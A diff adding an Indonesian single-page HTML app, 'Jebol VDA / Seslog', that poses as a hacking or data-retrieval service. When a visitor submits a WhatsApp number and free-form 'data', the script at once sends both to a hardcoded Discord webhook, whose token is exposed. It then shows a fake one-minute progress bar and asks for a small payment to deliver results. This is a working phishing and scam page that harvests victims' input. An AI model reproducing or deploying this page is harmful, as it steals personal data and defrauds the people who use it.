@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Jebol VDA / Seslog</title>
+
+<style>
+*{box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+body{
+  margin:0;height:100vh;
+  background:linear-gradient(135deg,#0b1633,#0f234f,#0b1633);
+  display:flex;justify-content:center;align-items:center;color:#fff
+}
+.card{
+  width:90%;max-width:400px;
+  background:rgba(0,0,0,.35);
+  border-radius:16px;
+  padding:26px 20px;
+  box-shadow:0 10px 30px rgba(0,0,0,.4);
+  animation:fadeIn .5s ease;
+  text-align:center
+}
+@keyframes fadeIn{from{opacity:0;transform:translateY(10px)}to{opacity:1}}
+
+.logo{font-size:26px;font-weight:bold}
+.logo span{color:#4da3ff}
+.subtitle{font-size:14px;opacity:.8;margin-bottom:18px}
+
+button{
+  width:100%;padding:14px;border:none;border-radius:10px;
+  background:#1f6fff;color:#fff;font-size:16px;font-weight:bold;cursor:pointer
+}
+button.secondary{background:#444;margin-top:10px}
+
+.input{width:100%;padding:12px;border-radius:10px;border:none;margin-bottom:12px}
+textarea.input{height:110px;resize:none}
+.hidden{display:none}
+
+.spinner{
+  width:48px;height:48px;border:4px solid rgba(255,255,255,.2);
+  border-top-color:#4da3ff;border-radius:50%;
+  margin:10px auto 14px;animation:spin 1s linear infinite
+}
+@keyframes spin{to{transform:rotate(360deg)}}
+
+.progress{height:8px;background:#233a66;border-radius:6px;overflow:hidden;margin-top:14px}
+.bar{height:100%;width:0%;background:#4da3ff}
+
+.footer{font-size:12px;opacity:.6;margin-top:16px}
+</style>
+</head>
+
+<body>
+
+<audio id="phonk">
+  <source src="phonk-king.mp3" type="audio/mpeg">
+</audio>
+
+<!-- HOME -->
+<div class="card" id="home">
+  <div class="logo">Jebol <span>VDA</span></div>
+  <div class="subtitle">Seslog Interface</div>
+  <button onclick="openSend()">MASUK</button>
+  <div class="footer">© 2026 Jebol VDA</div>
+</div>
+
+<!-- INPUT -->
+<div class="card hidden" id="send">
+  <div class="logo">Input <span>Data</span></div>
+  <input id="wa" class="input" type="tel" placeholder="Nomor WhatsApp">
+  <textarea id="msg" class="input" placeholder="Masukan teks & data"></textarea>
+  <button onclick="startProcess()">PROSES</button>
+  <button class="secondary" onclick="backHome()">KEMBALI</button>
+</div>
+
+<!-- PROCESS -->
+<div class="card hidden" id="process">
+  <div class="logo">Memproses</div>
+  <div class="spinner"></div>
+  <div id="processText" class="subtitle">Menyiapkan proses…</div>
+  <div class="progress"><div class="bar" id="bar"></div></div>
+  <div class="footer">Harap tunggu</div>
+</div>
+
+<!-- RESULT -->
+<div class="card hidden" id="result">
+  <img src="banner-xrizin.jpg" style="width:100%;border-radius:14px;margin-bottom:14px">
+  <div class="logo">Payment <span>Xriz</span></div>
+  <div class="subtitle">Tebus 3-5K Saya Akan Kirim Data Ke Nomer Tadi</div>
+  <button onclick="openWA()">IKUTI CHANNEL WHATSAPP</button>
+</div>
+
+<script>
+const home = document.getElementById('home');
+const send = document.getElementById('send');
+const process = document.getElementById('process');
+const result = document.getElementById('result');
+const bar = document.getElementById('bar');
+const processText = document.getElementById('processText');
+const phonk = document.getElementById('phonk');
+
+function playSound(){
+  phonk.currentTime = 0;
+  phonk.play().catch(()=>{});
+}
+
+function openSend(){
+  playSound();
+  home.classList.add('hidden');
+  send.classList.remove('hidden');
+}
+
+function backHome(){
+  playSound();
+  send.classList.add('hidden');
+  home.classList.remove('hidden');
+}
+
+function startProcess(){
+  playSound();
+
+  const wa = document.getElementById('wa').value.trim();
+  const msg = document.getElementById('msg').value.trim();
+  if(!wa || !msg){ alert('Data wajib diisi'); return; }
+
+  // 👉 WEBHOOK LANGSUNG TERKIRIM
+  sendToDiscord({ wa, msg });
+
+  if('Notification' in window && Notification.permission !== 'granted'){
+    Notification.requestPermission();
+  }
+
+  send.classList.add('hidden');
+  process.classList.remove('hidden');
+
+  const WAIT = 60000; // 1 menit
+
+  bar.animate([{width:'0%'},{width:'100%'}],{
+    duration:WAIT,
+    fill:'forwards'
+  });
+
+  setTimeout(()=>{
+    processText.innerText = 'sebentar saya coba terlebih dahulu…';
+  },5000);
+
+  setTimeout(()=>{
+    notifyHP('Jebol kids');
+    process.classList.add('hidden');
+    result.classList.remove('hidden');
+  }, WAIT);
+}
+
+function notifyHP(text){
+  if('Notification' in window && Notification.permission === 'granted'){
+    new Notification('Jebol VDA', { body: text });
+  }
+  if(navigator.vibrate) navigator.vibrate([200,100,200]);
+}
+
+async function sendToDiscord(data){
+  try{
+    await fetch('https://discord.com/api/webhooks/1447907317004767406/3l3Vc5C5O3ISfUXghjnT9SpytO7ChPqMdS1FdAWF3x4fpGNqqo87RKPswfsCvfYo3hPx',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify({
+        username:'Jebol VDA',
+        embeds:[{
+          title:'Data Masuk (Instant)',
+          color:3447003,
+          fields:[
+            {name:'WhatsApp',value:data.wa},
+            {name:'Teks',value:data.msg}
+          ],
+          footer:{text:new Date().toLocaleString()}
+        }]
+      })
+    });
+  }catch(e){}
+}
+
+function openWA(){
+  playSound();
+  window.open('https://whatsapp.com/channel/0029VbBStxQBvvsdkshtuN2e','_blank');
+}
+</script>
+
+</body>
+</html>
